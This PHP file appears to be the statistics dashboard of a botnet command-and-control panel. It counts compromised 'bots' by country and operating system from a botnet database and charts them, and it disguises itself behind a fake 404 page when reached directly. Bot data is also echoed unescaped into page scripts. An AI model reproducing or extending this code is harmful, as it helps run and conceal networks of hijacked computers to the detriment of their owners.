<?php
if (!defined('N3N')) {
    header('HTTP/1.1 404 Not Found');
    header('Status: 404 Not Found');
    $nn = '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">' . PHP_EOL
        . '<html><head>' . PHP_EOL
        . '<title>404 Not Found</title>' . PHP_EOL
        . '</head><body>' . PHP_EOL
        . '<h1>Not Found</h1>' . PHP_EOL
        . '<p>The requested URL ' . htmlspecialchars($_SERVER['REQUEST_URI']) . ' was not found on this server.</p>' . PHP_EOL
        . '<p>Additionally, a 404 Not Found' . PHP_EOL
        . 'error was encountered while trying to use an ErrorDocument to handle the request.</p>' . PHP_EOL
        . '</body></html>';
    die($nn);
}
global $country_array;

$bot_map_list = null;
$bot_map_result = $mysqli->query('SELECT DISTINCT bot_country, COUNT(*) AS count FROM botnet_bots GROUP BY bot_country ORDER BY count DESC');
while ($row = $bot_map_result->fetch_array()) {
    $bot_map_list .= '[\'' . $country_array[$row['bot_country']] . '\',' . $row['count'] . '],' . PHP_EOL;
}

$bot_os_list = null;
$bot_os_result = $mysqli->query("SELECT DISTINCT bot_os, COUNT(*) AS count FROM botnet_bots GROUP BY bot_os ORDER BY count DESC");
while ($row = $bot_os_result->fetch_array()) {
    $bot_os_list .= '[\'' . urldecode($row['bot_os']) . '\', ' . $row['count'] . '],' . PHP_EOL;
}

$bot_cn_list = null;
$bot_cn_result = $mysqli->query("SELECT bot_country, COUNT(*) AS count FROM botnet_bots WHERE bot_date >= CURDATE() GROUP BY bot_country ORDER BY count DESC LIMIT 10");
while ($row = $bot_cn_result->fetch_array()) {
    $bot_cn_list .= '[\'' . $country_array[$row['bot_country']] . '\',' . $row['count'] . '],' . PHP_EOL;
}

$bot_top_country = null;
$bot_top_result = $mysqli->query("SELECT bot_country, COUNT(*) AS count FROM botnet_bots WHERE bot_date >= CURDATE() GROUP BY bot_country ORDER BY count DESC LIMIT 10");
while ($row = $bot_top_result->fetch_array()) {
    $bot_top_country .= '[\'' . $country_array[$row['bot_country']] . '\',' . $row['count'] . '],' . PHP_EOL;
}


?>
<script type="text/javascript" src="https://www.gstatic.com/charts/loader.js"></script>
<script>

    google.charts.load('current', {
        'packages': ['table', 'corechart'],
    });

    google.charts.setOnLoadCallback(drawTopCoutry);
    function drawTopCoutry() {
        var data = google.visualization.arrayToDataTable([
            ['Top 10 country', 'Count'],
            <?php echo $bot_top_country; ?>
        ]);
        var options = {
            title: 'Top 10 country',
            titleTextStyle: {color: '#fcfcfc'},
            legendTextStyle: {color: '#fcfcfc'},
            pieSliceBorderColor: 'gray',
            backgroundColor: {
                fill: 'transparent'
            },
            chartArea: {
                width: '100%',
                height: '80%'
            }
        };
        var chart = new google.visualization.PieChart(document.getElementById('div_top_statistics'));
        chart.draw(data, options);
    }

    google.charts.setOnLoadCallback(drawOS);
    function drawOS() {
        var data = google.visualization.arrayToDataTable([
            ['OS', 'Count'],
            <?php echo $bot_os_list; ?>
        ]);
        var options = {
            title: 'OS Statistics',
            titleTextStyle: {color: '#fcfcfc'},
            legendTextStyle: {color: '#fcfcfc'},
            pieSliceBorderColor: 'gray',
            backgroundColor: {
                fill: 'transparent',
            },
            chartArea: {
                width: '80%',
                height: '80%'
            }
        };
        var chart = new google.visualization.PieChart(document.getElementById('div_os_statistics'));
        chart.draw(data, options);
    }
    google.charts.setOnLoadCallback(CountryMap);
    function CountryMap() {
        var data = google.visualization.arrayToDataTable([
            ['Country', 'Bots'],
            <?php echo $bot_map_list; ?>
        ]);
        var options = {
            titleTextStyle: {color: 'white'},
            legendTextStyle: {color: 'white'},
            sizeAxis: {minValue: 0, maxValue: 100},
            backgroundColor: 'transparent',
            colorAxis: {colors: ['#54C492', '#cc0000'], textStyle: {color: 'white'}},
            width: '100%',
            datalessRegionColor: '#dedede'
        };
        var chart = new google.visualization.GeoChart(document.getElementById('div_geo_map'));
        chart.draw(data, options);
    }
</script>

